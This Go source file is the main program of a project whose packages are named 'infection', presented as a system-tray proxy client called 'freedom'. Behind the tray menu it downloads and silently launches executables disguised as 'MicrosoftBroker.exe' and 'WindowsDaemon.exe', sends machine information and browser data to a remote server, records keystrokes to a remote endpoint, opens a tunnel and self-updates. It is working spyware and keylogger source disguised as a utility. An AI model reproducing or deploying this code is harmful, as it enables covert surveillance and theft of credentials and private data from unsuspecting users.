package main

import (
	"github.com/scottkiss/grtm"
	"infection/browser"
	"infection/etcd"
	"infection/hitboard"
	"infection/killit"
	"infection/machineinfo"
	"infection/transfer"
	"infection/tunnel"
	"infection/util/icon"
	"infection/util/lib"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"sync/atomic"
	"syscall"
	"systray"
)

var localAddr string

type Info struct {
	Dev        bool
	ClientPort int
	PacPort    string
}

var Config = Info{
	true,
	8888,
	":9999",
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}
func onReady() {
	//load tunnel config
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)
	go transfer.PacHandle(Config.PacPort)
	go func() {
		//fixed ioop download check
		_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
		if err != nil {
			log.Println(err)
			downflag := make(chan string)
			//keep the main process live
			go lib.MultiFileDown([]string{}, "init", downflag)
			<-downflag
			//open the door
			cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()
			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
			finflag := make(chan string)
			go machineinfo.MachineSend("http://"+conf.Url+":5002/machine/machineInfo", finflag)
			<-finflag
			go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
		} else {
			cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()
		}
		go killit.Killit()
		go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
		go tunnel.Tunnel(conf.Url)
		////check update
		go lib.DoUpdate()
	}()
	//control proxy thread
	gm := grtm.NewGrManager()

	//block
	systray.SetIcon(icon.Data)
	systray.SetTitle("freedom")
	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
	start := systray.AddMenuItem("Start", "Start")
	stop := systray.AddMenuItem("Stop", "Stop")
	go func() {
		<-mQuit.ClickedCh
		systray.Quit()
	}()
	//loop up the switch signal
	for {
		select {
		case <-start.ClickedCh:
			appConfig := appConfigMgr.config.Load().(*AppConfig)
			log.Println(appConfig)
			go gm.NewGoroutine("proxy", transfer.InitCfg, appConfig.Url+":5003", localAddr)
			start.Check()
			stop.Uncheck()
			start.SetTitle("Start")
			systray.SetTooltip("running")
		case <-stop.ClickedCh:
			go gm.StopLoopGoroutine("proxy")
			stop.Check()
			start.Uncheck()
			stop.SetTitle("Stop")
			systray.SetTooltip("stop")
		}
	}
}
func onExit() {
	lib.KillALL()
}
func init() {
	lib.KillCheck()
	//currentprogram path log
	content, _ := transfer.GetTargetPath()
	data := []byte(content)
	if ioutil.WriteFile(lib.CURRENTPATHLOG, data, 0644) == nil {
	}
	if !Config.Dev {
		log.Println("已启动free客户端，请在free" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
		log.SetOutput(f)
	}

	localAddr = ":" + strconv.Itoa(Config.ClientPort)
}
func main() {
	systray.Run(onReady, onExit)
}
